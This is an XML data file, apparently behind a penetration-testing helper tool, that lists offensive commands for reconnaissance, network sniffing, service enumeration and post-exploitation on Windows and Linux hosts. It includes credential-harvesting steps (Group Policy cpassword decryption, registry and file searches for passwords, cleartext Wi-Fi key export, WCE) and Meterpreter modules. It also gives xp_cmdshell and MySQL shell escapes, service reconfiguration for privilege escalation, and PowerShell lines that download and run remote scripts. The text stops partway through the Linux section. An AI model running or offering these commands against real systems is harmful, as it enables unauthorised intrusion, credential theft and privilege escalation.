<?xml version="1.0"?>
<types>
<type name="Enumerate">
	<area name="Remote Passive">
		<option name="DNS Target Mapping">
            <info>Query DNS servers for information regarding the domain.

Standard DNS Enumeration:
    dnsrecon -d [domain]
    
Heavy DNS Enumeration:
    dnsrecon -d [domain] -a -g -w -z
    
Reverse Lookup:
    dnsrecon -t rvl -r [IP Range (CIDR)]
    
Brute Force Hidden Domains:socat
    dnsrecon -t brt -D [dictionary file] -d [domain]
    (e.g. /usr/share/dirbuster/wordlists/directories.jbrofuzz)
            </info>
		</option>
        <option name="Web Server Fingerprinting">
            <info>Gather more information about a service running on a system's open port by banner grabbing.
            
Usage:
    nc [ip address] 80
    HEAD / HTTP/1.0
    [Enter]</info>
            
        </option>
        <option name="Web Server Lookup">
            <info>Gather information about the server from various sources.
                
Usage:
    dmitry -iwnse [domain]</info>
            
        </option>
        <option name="Traceroute">
            <info>Follow the trail of a ping to the target.
                
Usage:
    traceroute -A [target]</info>
        </option>
        <option name="Website Mapping - Dictionary Attack">
            <info>Launch a dictionary attack against a website.
            
Usage:
    dirb [target] [wordlist]

Example:
    dirb http://192.168.1.224/ /usr/share/wordlists/dirb/common.txt -f
    dirb http://192.168.1.224/ /usr/share/wordlists/metasploit/joomla.txt</info>
            
        </option>
        <option name="Website Mapping - Spidering">
            <info>Map a website by spidering through every link.
            
1) Open BurpSuite, enable proxy intercept.

2) Configure a terminal to use Burpsuite as a proxy:
    export http_proxy='http://127.0.0.1:8080'
    
3) Fetch the target website root in the terminal:
    curl [target]
    
4) In BurpSuite, right-click the new target and select 'Spider this host'</info>
            
        </option>
        <option name="Website Cloning">
            <info>Clone a webpage and save the clone locally.
            
Usage:
    httrack [target] -O [output directory]</info>
            
        </option>
        <option name="Check Domain Variations">
            <info>Generate and test domain typos and variations to detect and perform typo squatting, URL hijacking, phishing, etc...
                
Usage:
    urlcrazy -r [domain]</info>
            
        </option>
        <option name="Search for Related People">
            <info>Search open sources for emails, people, and hosts related to the domain.

Usage:
    theharvester -d [domain] -l 500 -b google
    theharvester -d [domain] -l 500 -b pgp
    theharvester -d [domain] -l 500 -b linkedin
    theharvester -d [domain] -l 500 -b google-profiles</info>
            
        </option>
        <option name="Search for Related Documents">
            <info>Search open source for related documents.
                
Usage:
    metagoofil -d [domain] -t [doctype] -l 100 -n [download limit] -o [output directory] -f [analysis file].html
    
Doctypes:
    pdf, doc, xls, ppt, odp, ods, docx, xlsx, pptx</info>
            
        </option>
        <option name="Scrape Emails from Site">
            <info>Spider through a website looking for email addresses.

Usage:
    cewl -d [depth] -n -e --email_file [output file] [URL]</info>
            
        </option>
        <option name="Pull Common Words from Site">
            <info>Spider a website and compile a list of common words.
            
Usage:
    cewl -d [depth] -m [minimum word length] -w [output file] [domain]</info>
            
        </option>
        <option name="Screenshot Site">
            <info>Take a screenshot of a web page.
            
Usage:
    cutycapt --url=[target] --out=[output].png (--user-agent=[user agent])</info>
            
        </option>
        <option name="Google Dorking">
            <info>Use advanced Google operators to design more sophisticated searches.

Operators:
    site: [url]             search only one [url]
    numrange: [#]...[#]     search within a number range
    date: [#]               search within past [#] months
    link: [url]             find pages that link to [url]
    related: [url]          find pages related to [url]
    intitle: [string]       find pages with [string] in title
    inurl: [string]         find pages with [string] in url
    filetype: [xls]         find files that are xls
    phonebook: [name]       find phone book listings of [name]</info>
            
        </option>
	</area>
    <area name="Web Application">
        <option name="Automatic Enumeration">
            <info>Automatically use various tools to enumerate a Web Application.
                
Usage:
    golismero --forbid-subdomains -o [output] [target]</info>
            
        </option>
        <option name="Automatic Enumeration - Metasploit">
            <info>Automatically use Metasploit's various modules to enumerate a Web Application.
                
Usage:
    &gt; msfconsole
    msf&gt; load wmap
    msf&gt; wmap_sites -a http://[target ip](:port)
    msf&gt; wmap_targets -t http://[target ip](:port)/[site base]
    msf&gt; wmap_run -t
    msf&gt; wmap_run -e
    msf&gt; vulns</info>
        </option>
        <option name="Check for Firewall">
            <info>Scan the target to determine if it is behind a WAF.
                
Usage:
    wafw00f [target]</info>
            
        </option>
        <option name="Check for Load-Balancing">
            <info>Scan the target to determine if it implements load-balancing.
                
Usage:
    lbd [target]</info>
            
        </option>
        <option name="Check IP Fragment Reassembly Behavior">
            <info>Probe a host to determine its TCP/IP stack behavior with regards to packet fragmentation.
                
Usage:
    fragtest all [host]
    
Tests:
    ping            Send an ICMP echo request to the host.
    ip-opt          Send ICMP echo requests with different IP options, to see which IP options are supported.
    frag            Send an ICMP echo request as 8-byte fragments.
    frag-new        Send an ICMP echo request as 8-byte fragments with an overlapping 16-byte fragment, favoring new data in reassembly.
    frag-old        Send an ICMP echo request as 8-byte fragments with an overlapping 16-byte fragment, favoring older data in reassembly.
    frag-timeout    Send an ICMP echo request as 8-byte fragments, omitting the last fragment, and wait for an ICMP tim-exceeded-in-reassembly reply.</info>
            
        </option>
        <option name="Check SSL Configuration">
            <info>Analyze the SSL configuration of a server by connecting to it.
                
Usage:
    sslyze --regular [host]
(and)
    tlssled [host] 443</info>
            
        </option>
        <option name="Crawl for Vulnerabilities">
            <info>Crawl through a web application looking for vulnerabilities.
            
Usage:
    skipfish -o [output directory] -b f -d [crawl depth] -S [wordlist] [advanced options] [target]
    
Advanced Options:
    -A user:pass        use specified HTTP authentication credentials
    -C name=val         append custom cookie to all requests
    -N                  do not accept any new cookies
    -I string           only follow URLs matching string
    -X string           exclude URLs matching string
            </info>
            
        </option>
        <option name="Webdav access">
            <info>Access the web application through WebDav.
                
Usage:
    cadaver [target]
    (default credentials: wampp/xampp)</info>
        </option>
        <option name="CMS - Joomla">
            <info>Enumerate information from a Joomla CMS website.
            
General:
    joomscan -u [target] (-x [proxy ip]:[port] -g "[user agent]")
    
Plugins:
    BlindElephant.py [target] joomla</info>
            
        </option>
        <option name="CMS - Drupal">
            <info>Enumerate information from a Drupal CMS website.
                
Usage:
    nmap -p 80 --script http-drupal-enum [target]
    nmap --script=http-drupal-enum-users --script-args http-drupal-enum-users.root="/path/" [target]

Plugins:
    BlindElephant.py [target] drupal</info>
            
        </option>
        <option name="CMS - Wordpress">
            <info>Enumerate information from a Wordpress CMS website.
            
General:
    wpscan --url [target] --enumerate
(or)
    nmap -sV --script http-wordpress-enum [target]
    nmap -p80 --script http-wordpress-users (--script-args limit=50) [target]
    
Plugins:
    plecost -n [number of plugins to try] -s [seconds between probes] -i /usr/share/plecost/wp_plugin_list.txt [target]
(or)
    BlindElephant.py [target] wordpress
            </info>
            
        </option>
    </area>
    <area name="Network Passive">
        <option name="ARP Capture">
            <info>Listen to the natural ARP communication on a network and recognize IP Addresses and MAC Addresses of network devices.
                
Usage:
    netdiscover [-p passive mode: do not send anything, only sniff]</info>
        </option>
        <option name="Sniff Traffic">
            <info>Capture network traffic using TCPDump.

Usage:
    tcpdump [options] [filters]


Options:

    -n              Don't resolve hostnames
    -nn             Don't resolve hostnames or port names
    -X              Show packet contents in both hex and ASCII
    -e              Show ethernet header
    -S              Print absolute sequence numbers
    -vv             Extra verbose
    -c [x]          Stop after x number of packets


Filters:

    host [ip]               Traffic based on IP Address
    src [ip]                Traffic with source IP Address
    dst [ip]                Traffic with destination IP Address
    net [ip range]          Traffic based on entire network (CIDR notation)

    icmp                    Only get ICMP packets
    tcp / udp               Only get TCP / UDP packets
    ip6                     Only get ip6 traffic

    port [n]                Traffic to or from port n
    src port [n]            Traffic from port n
    dst port [n]            Traffic to port n

    less / greater [size]   Packets less / greater than size

    'tcp[13] &amp; N!=0'        Packets with a specific flag number N


Operators:  and, or, not


TCP Flags:

    32  URG
    16  ACK
    8   PSH
    4   RST
    2   SYN
    1   FIN


Examples:

Standard traffic capture:
    tcpdump -nnvvXSs 1514 -w [output].pcap

Capture 15 minutes ( seconds) of general traffic:
    tcpdump -nnvvXSs 1514 -w [output].pcap &amp; sleep 900; kill $!

Non-ICMP traffic destined for 192.168.0.2:
    tcpdump -nnvvXSs 1514 -w [output].pcap dst 192.168.0.2 and not icmp
    
Traffic from 10.0.2.4 and destined for ports 3389 or 22:
    tcpdump -nnvvXSs 1514 -w [output].pcap 'src 10.0.2.4 and (dst port 3389 or 22)'
    
All SYN packets:
    tcpdump -nnvvXSs 1514 -w [output].pcap 'tcp[13] &amp; 16 != 0'

All SYN/ACK packets:
    tcpdump -nnvvXSs 1514 -w [output].pcap 'tcp[13]=18'</info>
        </option>
        <option name="Sniff Traffic (CDP)">
            <info>Capture network traffic regarding CDP packets, then analyze it with Wireshark

Usage:
    cdpsnarf -i [interface] -w [output].pcap</info>
            
        </option>
        <option name="Sniff Traffic - Remote (Meterpreter)">
            <info>Capture network traffic on a remote host.
            
Usage:
    meterpreter &gt; use sniffer
    meterpreter &gt; sniffer_interfaces
    meterpreter &gt; sniffer_start [interface number]
    meterpreter &gt; sniffer_dump [interface number] [output file].cap
    meterpreter &gt; sniffer_stop</info>
            
        </option>
        <option name="Analyze Traffic">
            <info>Analyze unencrypted network traffic for various things.

View Traffic:
    wireshark [pcap file]

Cleartext credentials:
    dsniff -p [pcap file]
    
URLs visited:
    urlsnarf -p [pcap file]
    
Mail:
    mailsnarf -p [pcap file]
    
Images:
    driftnet -f [pcap file] -a -d [output directory]

Streamed Audio:
    driftnet -f [pcap file] -a -d [output directory] -S
    
Other Fingerprinting:
    p0f -r [pcap file]</info>
            
        </option>
        <option name="Fingerprint Windows Hosts">
            <info>Windows computers will automatically look for SMB shares on the network.  Sniff NBT-NS, BROWSER, LLMNR requests made and fingerprint the host.
                
Usage:
    responder -I [interface] -A -f</info>
        </option>
    </area>
    <area name="Network Active">
        <option name="Scan - Nmap">
            <info>Scan an IP using Nmap.
            
Usage:
    nmap [options] [target(s)]
    

Options
------------------------

Scans:
    -sT         TCP Connect
    -sS         SYN Scan (default)
    -sU         UDP Scan
    -sn         Ping Scan
    -sA         ACK Scan (firewall)
    -6          IPv6 Scan
    -sI [ip]    Idle Scan
    -b [ip]     FTB Bounce Scan
    
Port Selection:
    -p 80,443   scan ports 80 and 443
    -p 1-100    scan ports 1 through 100
    -F          scan 100 most common ports
    -p-         scan all 65535 ports
    
Advanced:
    -n          no dns resolution
    -Pn         no ping to confirm host is up
    -O          OS detection
    -sV         Version detection
    -sC         Perform default scripts
    --badsum    check for checksum verification
    
Evasion:
    -T[0-5]             Adjust timing (0=5m, 1=15s, 2=0.4s)
    -f                  fragment packets
    --mtu [n]           fragment packets with specific MTU
    -S [ip]             spoof source ip
    -g [port]           spoof source port
    --spoof-mac [mac]   spoof MAC address
    -D [ip,ip..]        use decoy(s)
    --randomize-hosts   randomize scan order
    
Output:
    -oN     Default output
    -oX     XML output
    -oA     All
    
* combine -oX to output.xml with following for html
    xsltproc /usr/share/nmap/nmap.xsl output.xml > output.html
    
Customize:
    --reason                Give reason behind each state
    --stats-every [time]    Periodically print status message
    --open                  Only show open ports
    

            </info>
            
        </option>
        <option name="ARP Forced Capture">
            <info>Send an ARP request over a range of IP addresses to discover network devices.

Usage:
    netdiscover [-i interface] [-r ip range] [-s time to sleep between each arp request (miliseconds)]</info>
        </option>
        <option name="ARP Forced Capture - Remote (Meterpreter)">
            <info>Send an ARP request over a range of IP address to discover network devices from a remote compromised host through a meterpreter session.
                
Usage:
    meterpreter &gt; run arp_scanner -r [subnet]/[CIDR]</info>
        </option>
        <option name="NetBIOS Forced Capture">
            <info>Send a request of a range of IP addresses to discover active NetBIOS network devices.
                
Usage:
    nbtscan -r [ip range]</info>
        </option>
        <option name="Ping Uptime">
            <info>Send a raw packet asking host to provide uptime.
                
Usage:
    hping3 -p [open port] -S --tcp-timestamp [host]</info>
            
        </option>
        <option name="Ping Sweep - Bash">
            <info>Scan a range of IPs for live hosts.
            
Usage:
    for x in {1..254};do ping -c 1 [su.b.net].$x | grep "64 b" | cut -d" " -f4 &amp;; done;
(or)
    for x in $(seq 1 254);do ping -c 1 [su.b.net].$x | grep "64 b" | cut -d" " -f4 &amp;; done;</info>
        </option>
        <option name="Ping Sweep - Windows">
            <info>Scan a range of IPs for live hosts.
                
Usage:
    for /L %x in (1,1,254) do @ (ping -n 1 -w 100 [su.b.net].%x 2&gt;null | find "Reply")</info>
            
        </option>
        <option name="Port Scan - Netcat">
            <info>Scan an IP for open ports using Netcat.
            
Usage:
    echo "" | nc -v -n -w1 [target IP] [start port]-[end port]</info>
            
        </option>
        <option name="Port Scan - Python">
            <info>Scan an IP for open ports using Python.
            
Usage:
    python -c '
    
        # Inputs
        
    ip="[target ip]"
    l=[start port]
    h=[end port]
    
        # Body
        
    import socket as sk;
    for p in range(l,h):
        try:
            s=sk.socket(sk.AF_INET,sk.SOCK_STREAM)
            s.settimeout(1000)
            s.connect((ip,p))
            print "%d:OPEN" % (p)
            s.close
        except: continue'</info>
            
        </option>
        <option name="Port Scan - Perl">
            <info>Scan an IP for open ports using Perl.
            
Usage:
    perl -e '
    
        # Inputs
    
    my $ip="[target ip]";
    my $l=[start port];
    my $h=[end port];
    
        # Body
    
    use strict;use IO::Socket;
    for (my $p=$l;$p&lt;=$h;$p++){
    my $r=IO::Socket::INET->new(
    PROTO=&gt;"tcp",PeerAddr=&gt;$ip,PeerPort=&gt;$p);
    if($r){print "$p:OPEN\n"};}'</info>
            
        </option>
        <option name="Port Scan - PHP">
            <info>Scan an IP for open ports using PHP.
                
Usage:
    php -r '
    
        // Inputs
        
    $ip="[target ip]";
    $l=[start port];
    $h=[end port];
    
        // Body
        
    for($p=$l;$p&lt;=$h;$p++){
    $fp=fsockopen($ip,$p);
    if($fp) {
    echo "$port:OPEN";
    fclose($fp);}}'
    
(or)

    php -r '
    
        // Inputs
        
    $ip="[target ip]";
    $l=[start port];
    $h=[end port];
    
        // Body
    
    $s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);
    for($p=$l;$p&lt;=$h;$p++){
    $c=socket_connect($s,$ip,$p);
    if($c) {
    echo "$port:OPEN";
    socket_close($s)
    $s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);}}'</info>
            
        </option>
        <option name="Port Scan - Remote (Meterpreter)">
            <info>Scan a remote IP for open ports through a compromised host using a meterpreter session.

Usage:
    (add route to subnet through meterpreter session)
    use auxiliary/scanner/portscan/tcp
    set RHOSTS [target ip]
    set PORTS 1-1024
    run</info>
        </option>
        <option name="NetBIOS">
            <info>Extract information from a NetBIOS service.

Usage:
    nbtscan -v [target]
    
Character Values:

    Unique Names:
        &lt;00&gt;  Workstation Service Name
        &lt;03&gt;  Messenger Service Name
        &lt;1B&gt;  Domain Browser Name
        &lt;06&gt;  RAS Server Service
        &lt;1F&gt;  NetDDE Service
        &lt;20&gt;  File Server Service Name
        &lt;21&gt;  RAS Client
        &lt;BE&gt;  Network Monitor Agent
        &lt;BF&gt;  Network Monitor Utility
    
    Group Names:
        &lt;1C&gt;  Domain Group Name
        &lt;1D&gt;  Master Browser Name
        &lt;1E&gt;  Normal Group Name
        &lt;01&gt;  Domain Master Browser</info>
            
        </option>
        <option name="SMB">
            <info>Extract information from a SMB service.
       
Without Credentials:

    Usage:
        enum4linux [target]
        
    Null Session Enumeration:
        rpcclient -U "" [target ip]
        &gt; [Enter]
        &gt; srvinfo
        &gt; enumdomusers
        &gt; getdompwinfo
    (or)
        nmblookup -A [target ip] -&gt; look for &lt;20&gt;
        smbclient -L \\[server] -I [target ip]
        smbclient //[server]/[share] -I [target ip] -N
    
With Credentials:

    Usage:
        smb://[target ip]/[share]
    (or)
        smbclient -U [user] \\\\[target ip]\\[share]
    (or)
        smbmap -u [user] -p [password / NTLM hash] -d [domain] -H [target]
    
    List drives:
        smbmap -u [user] -p [password / NTLM hash] -d [domain] -H [target] -L

    Recursively list directories and files:
        smbmap -u [user] -p [password / NTLM hash] -d [domain] -H [target] -R

    List files in specific directory:
        smbmap -u [user] -p [password / NTLM hash] -d [domain] -H [target] -r [path]

    Download file:
        smbmap -u [user] -p [password / NTLM hash] -d [domain] -H [target] --download [source]
        
    Search file contents:
        smbmap -u [user] -p [password / NTLM hash] -d [domain] -H [target] -F [pattern]
        * example pattern: SSN
            '[1-9][0-9][0-9]-[0-9][0-9]-[0-9][0-9][0-9][0-9]'
        
* Check for Credentials in Group Policies (Active Directory)
    \\&lt;DOMAIN&gt;\SYSVOL\&lt;DOMAIN&gt;\Policies\</info>
            
        </option>
	<option name="ISCSI">
		<info>Extract information from an ISCSI service.

If not installed:
	apt-get install open-iscsi
			
1) Discover target name:
	iscsiadm -m discovery -t sendtargets -p [target ip]
e.g.
> iscsiadm -m discovery -t sendtargets -p 192.168.56.103
192.168.56.103:3260,1 iqn.2017-02.local.skuzzy:storage.sys0
(target name is 'iqn.2017-02.local.skuzzy:storage.sys0')
			
2) Login:
	iscsiadm --mode node --targetname [target name] --poral [target ip] --login

3) Mount:
	fdisk -l
	(find new drive)
	mkdir /tmp/iscsi-share
	mount [new drive] /tmp/iscsi-share</info>
	</option>
        <option name="SNMP">
            <info>Extract information from an SNMP service.
            
Usage:
    snmpcheck -t [target] -c [community string] -w
(or)
    nmap -sU --open -p 161 [target] --open
(or)
    onesixtyone -c [community strings].txt [target]
        -&gt; /usr/share/doc/onesixtyone/dict.txt
    
With community string:
    snmpenum ...
(or)
    snmpwalk -c [community string] -v1 [target]
    (filtered) snmpwalk -c [community string] -v1 [target] [mib-value*]
    
* mib-values
1.3.6.1.2.1.25.1.6.0    System Processes
1.3.6.1.2.1.25.4.2.1.2  Running Programs
1.3.6.1.2.1.25.4.2.1.4  Processes Path
1.3.6.1.2.1.25.2.3.1.4  Storage Units
1.3.6.1.2.1.25.6.3.1.2  Software Name
1.3.6.1.4.1.77.1.2.25   User Accounts
1.3.6.1.2.1.6.13.1.3    TCP Local Ports
            </info>
            
        </option>
        <option name="SMTP">
            <info>Extract information from an SMTP service.
            
Extract Users:
    telnet [target] 25
        -&gt; VRFY [user]
(or)
    smtp-user-enum -M [VRFY|EXPN|RCPT] -U [userlist] -t [target] (-D [domain])
(or)
    nmap -p 25 --script smtp-enum-users.nse [--script-args smtp-enum-users.methods={EXPN,VRFY,RCPT},userdb=[userlist]] [target]

        -&gt; /usr/share/fern-wifi-cracker/extras/wordlists/common.txt
        -&gt; /usr/share/wordlists/dirb/others/names.txt
        -&gt; /usr/share/wordlists/wfuzz/others/names.txt
Automate:
    for user in $(cat [users].txt); do echo VRFY $user | nc -nv -w 1 [target] 2&gt;/dev/null | grep ^"250";done

Discover if vulnerable to mail relay:
    nmap -p 25 --script smtp-open-relay.nse [target]</info>
            
        </option>
        <option name="POP3">
            <info>Retrieve mail from a POP3 service.
                
Login:
    telnet [target] 110
(or for pop3s)
    openssl s_client -connect [target]:995
    &gt; USER [username]
    &gt; PASS [password]
    
List messages:
    &gt; LIST
    
Retrieve message:
    &gt; RETR [message id]
    
Delete message:
    &gt; DELE [message id]</info>
        </option>
        <option name="DNS">
            <info>Extract information from a DNS service.
                
Usage:
    nslookup
    &gt; server [target DNS server]
    &gt; [target ip]
    &gt; [target domain]

Zone Transfer:
    dig axfr @[target DNS server] [target domain]</info>
        </option>
        <option name="NFS">
            <info>Extract information from a NFS service.
                
Usage:
    rpcinfo -p [target ip]
    showmount -e [target ip]
    
Mount NFS share:
    mount -t ntf [target ip]:[share] [mount location] -o nolock</info>
        </option>
        <option name="MySQL">
            <info>Interact with a MySQL Database.
            
Usage:
    mysql -h [target ip] -u [username] (-p [database])
    &gt; [password]
    mysql&gt; [query]
    
Queries:
    show databases
    use [database]
    show tables
    select * from [table]

    (execute command) \! [command]
    (drop into shell) \! /bin/bash</info>
        </option>
        <option name="MS-SQL">
            <info>Interact with a MS-SQL Database.
            
Usage:
    sqsh -S [target ip] -U [username]
    &gt; [password]
    1&gt; [query]
    2&gt; go
    
Queries:
    (list databases) SELECT name FROM master..sysdatabases
    (list tables) SELECT table_name from information_schema.tables
    (list columns) SELECT column_name from information_schema.columns where table_name='[table]'
    (list users) SELECT name from master..syslogins
    (execute command) xp_cmdshell '[command]'
            </info>
        </option>
        <option name="Printer (Ricoh)">
            <info>Most Ricoh Savin network printers hold an open port on 514/tcp, which can be used to execute commands remotely.

Usage:
    rsh [ip address] info
    rsh [ip address] stat
    rsh [ip address] syslog
    rsh [ip address] prnlog
    rsh [ip address] ps
    
* also check the web portal for email addresses, hostname, cached print jobs, and domain query capabilities.</info>
            
        </option>
        <option name="Printer (JetDirect)">
            <info>The device password for many JetDirect printers is stored in hex and is accessible via SNMP using the read community string.  Default could by "public" or "internal".  If those don't work, try brute forcing common/custom read community strings.
                
Usage:
    snmpget -v 1 -c [community string] [ip address] .1.3.6.1.4.1.11.2.3.9.1.1.13.0

If that doesn't work, use snmpwalk to retrieve all stored values, and look for "Hex-STRING".

Usage:
    snmpwalk -v 1 -c [community string] [ip address]
    
* also check the web portal for email addresses, hostname, cached print jobs, and domain query capabilities.</info>
            
        </option>
    </area>
    <area name="Local - Windows">
        <option name="User Information">
            <info>Dump information related to the user(s).
            
Current user:
    whoami
    hostname
    echo %username%
    net user %username%
    
All users:
    net users
    wmic useraccount get Domain,Name</info>
        </option>
        <option name="Operating System">
            <info>Dump information related to the underlying system.
                
Operating System:
    systeminfo
    ver
    (remote) systeminfo /S [remote ip] /U [domain]\[user] /P Pwd
    
Kernel (32 or 64 bit):
    wmic cpu get DataWidth /format:list

Patches:
    wmic qfe get Caption,Description,HotFixId,InstalledOn
    wmic qfe get Caption,Description,HotFixId,InstalledOn | findstr /C:"KB.." /C:"KB.."

    * Notable Exploits for patch number
    KiTrap0D    -   KB979682
    MS11-011    -   KB2393802
    MS10-059    -   KB982799
    MS10-021    -   KB979683
    MS11-080    -   KB2592799
    
List Drives:
    fsutil fsinfo drives
    wmic logicaldisk get Description,Name
            </info>
        </option>
        <option name="Network Connections and Configuration">
            <info>Dump information related to the network connections and configuration.

Interfaces:
    ipconfig /all
    netsh interface ip show interfaces

Routing table:
    route print
    
Local DNS Cache
    ipconfig /displaydns
    
Known MACs:
    arp -A
    
Active network connections:
    netstat -ano
    
Firewall status:
    netsh firewall show state
    netsh firewall show config
    
Saved Wireless Profiles:
    netsh wlan show profiles
    netsh wlan export profile folder=. key=clear
    
Check Outbound Ports:
    msf > use post/windows/recon/outbound_ports</info>
        </option>
        <option name="Domain">
            <info>Dump information related to the domain.
                
Domain info:
    wmic ntdomain list
                
Hosts in current domain:
    net view /domain
    
Hosts in other domain:
    net view /domain:[domain]
    
All users in current domain:
    net user /domain
    
Tickets in use by current session:
    klist
    
Domain password policy:
    net accounts /domain
    
List local Admins:
    net localgroup "Administrators"

List domain groups:
    net group /domain
    
Users in Domain Admins:
    net group "Domain Admins" /domain
    
List DCs for current domain:
    net group "Domain Controllers" /domain
    
Current SMB shares:
    net share
    
Active SMB sessions:
    net session | find / "\\"
    
Access Domain Share:
    dir \\[remote server]\[share]
    
Mount Domain Share:
    net use z: \\[remote server]\[share]
    
Check Groups.xml:
        * mount domain share to z:
    z:\>dir /s Groups.xml
        * shows directory
    z:\>copy [directory] C:\[somewhere]
    C:\[somewhere]>type Groups.xml
        * shows cpassword
    ...
    root@kali~# gpp-decrypt
        [cpassword]</info>
        </option>
        <option name="Applications and Services">
            <info>Dump information related to the system's scheduled tasks.
                
Scheduled Tasks:
    SCHTASKS /Query /FO LIST /V
    
Running processes/services:
    tasklist /v
    tasklist /SVC
    tasklist /m
    wmic process get CSName,Description,ExecutablePath
    net start
    (remote) tasklist /S [remote ip] /v
    
Startup Tasks:
    wmic startup get
    
Installed Drivers:
    DRIVERQUERY
    
Most Recently Used Executables on Accessible Network Shares:

            </info>
        </option>
        <option name="Sensitive Files">
            <info>Dump information related to sensitive files located on the system.

Configuration files:
    type C:\sysprep.inf 2&gt; nul
    type C:\sysprep\sysprep.xml &gt; nul
    type %WINDIR%\Panther\Unattend\Unattended.xml 2&gt; nul
    type %WINDIR%\Panther\Unattended.xml 2&gt; nul
    
Domain Group Policy Configuration:
    meterpreter &gt; run post/windows/gather/credentials/gpp
    
Can any user install *.msi files as NT AUTHORITY\SYSTEM? (both set to 1)
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated 2&gt; nul
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated 2&gt; nul
    
Search file system for passwords:
    dir /s *pass* == *cred* == *vnc* == *.config*
    findstr /si password *.xml *.ini *.txt
    
Search registry for passwords:
    reg query HKLM /f password /t REG_SZ /s
    reg query HKCU /f password /t REG_SZ /s
    
Recently accessed files and web links:
    meterpreter &gt; run post/windows/gather/dumplinks</info>
        </option>
        <option name="Exploitable Locations">
            <info>Dump locations to place possible privilege escalation payloads.
                
Path (look for non-default directories with write access):
    echo %path%
    
World-Writeable directories:
    accesschk.exe /accepteula -uwcqv 'Authenticated Users' *
    accesschk.exe /accepteula -uwdqs Users C:\
    accesschk.exe /accepteula -uwdqs "Authenticated Users" C:\    

Directory write access:
    accesschk.exe /accepteula -dqv [directory]
    cacls [directory]
    
Executable access:
    icacls [executable].exe

World-Writeable files:
    accesschk.exe /accepteula -uwqs Users C:\*.*
    accesschk.exe /accepteula -uwqs "Authenticated Users" C:\*.*
    
Search for services with unquoted paths to binary:
    wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

Service Permissions:
    accesschk.exe /accepteula -ucqv [service]
    
Service Information:
    sc qc [service]      

Re-configure service:
    sc config [service] binpath= "[custom path]"
    sc config [service] obj== ".\LocalSystem" password= ""
    
Restart service:
    net start [service]


Automated Services:
---------------------------

Local Enumeration:
    powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerUp/PowerUp.ps1');Invoke-AllChecks
    
Accessible Domain Shares:
    Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview.ps1'); Invoke-ShareFinder -ExcludeIPC -ExcludePrint -CheckShareAccess | Out-File -Encoding ascii found_shares.txt"

Latest Run Executables (from accessible domain shares):
    Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview.ps1'); Invoke-FileFinder -ShareList .\found_shares.txt -FreshEXEs -ExcludeHidden -CheckWriteAccess"</info>
        </option>
        <option name="Available Utilities">
            <info>Dump information about the applications installed available to use.

Powershell:
    echo $PSVersionTable
    
Netcat:
    dir nc.exe /b/s
    nc -h

Ncat:
    ncat --version 2&gt; nul

SSH:
    dir putty.exe /b/s

Python:
    python -V 2&gt; nul
    
Perl:
    perl -v 2&gt; nul
    
Java:
    java -version 2&gt; nul
    
Ruby:
    ruby --version 2&gt; nul
    
gcc:
    gcc --version 2&gt; nul
    
cc:
    cc --version 2&gt; nul
    
PHP:
    php -v 2&gt; nul
    
Apache:
    dir httpd.exe /b/s
    httpd.exe -v

MySQL:
    dir mysql.exe /b/s
    mysql -h localhost -V

Postgres:
    dir postgres.exe /b/s
    psql --version

WinDump:
    windump 2&gt; nul
    
Nmap:
    nmap --version 2&gt; nul
    
Rinetd:
    rinetd 2&gt; nul
    
FPipe:
    fpipe 2&gt; nul</info>
        </option>
        <option name="Auto - Windows Binaries">
            <info>Automate information gathering with windows binaries (helpful after escalated privilege).
                
Windows Credential Editer:
    harvest credentials
    * /usr/share/wce/wce.exe</info>
        </option>
    </area>
    <area name="Local - Linux">
        <option name="User Information">
            <info>Dump information related to the user(s).
            
Current user:
    whoami
    who
    id
    hostname
    
User Uptime:
    w
    
User Login History:
    last

Users currently logged in:
    finger
    pinky
    users
    who -a
    
All Users:
    cat /etc/passwd
    cat /etc/group
    
Privileges:
    sudo -l
    grep -v -E '^#' /etc/passwd 2>/dev/null | awk -F: '$3 == 0{print $1}' 2>/dev/null
    cat /etc/sudoers</info>
        </option>
        <option name="Operating System">
            <info>Dump information related to the underlying system.
                
Operating System:
*   cat /etc/*-release
    cat /etc/issue

Kernel:
*   uname -mrs
    cat /proc/version
    rpm -q kernel
    dmesg | grep Linux
    ls /boot | grep vmlinuz-
    
Environmental Variables:
    cat /etc/profile
    cat /etc/bashrc
    cat ~/.bash_profile
    cat ~/.bashrc
    cat ~/.bash_logout
    env
    set
    
Mounted file-systems:
    mount
    df -h
    cat /etc/fstab
    
Printer:
    lpstat -a</info>
        </option>
        <option name="Applications and Services">
            <info>Dump information related to the currently running applications and services.

Current services:
    ps aux
    ps -ef
    top
    cat /etc/services
    service --status-all
    chkconfig --list
    
Current services running as root:
*   ps aux | awk '{print $1, $2, $9, $10, $11}' | grep root
    ps aux | grep root
    ps -ef | grep root
    
Installed Applications:
    for i in $(echo $PATH | tr ":" "\n");do ls -lah $i;done
    dpkg -l
    dpkg -get-selections
    rpm -qa
    rpm --query -all
    pkginfo
    ls -lAh /var/cache/apt/archives*
    ls -lAh /var/cache/yum
    
Scheduled Jobs:
    crontab -l
    ls -lAh /var/spool/cron
    ls -lA /etc/ | grep cron
    ls -lA /etc/cron*
    cat /etc/cron*
    cat /etc/at.allow
    cat /etc/at.deny
    cat /etc/cron.allow
    cat /etc/cron.deny
    cat /etc/crontab
    cat /etc/anacrontab
    cat /var/spool/cron/cron*
    cat /var/spool/cron/crontabs/root
    
Startup services:
    cat /etc/rc.d
    
Check for Protections:
    msf &gt; use post/linux/gather/enum_protections</info>
        </option>
        <option name="Network Connections and Configuration">
            <info>Dump information related to the network connections and configuration.
    
Interfaces:
    ifconfig
    cat /etc/network/interfaces
    cat /etc/sysconfig/network
    
Network Configuration:
    cat /etc/resolv.conf
    cat /etc/sysconfig/network
    cat /etc/networks
    iptables -L
    dnsdomainname
    
Current Connections:
    lsof -i
    lsof -i :80
    lsof -i -n -P
    grep 80 /etc/services
    netstat -antup
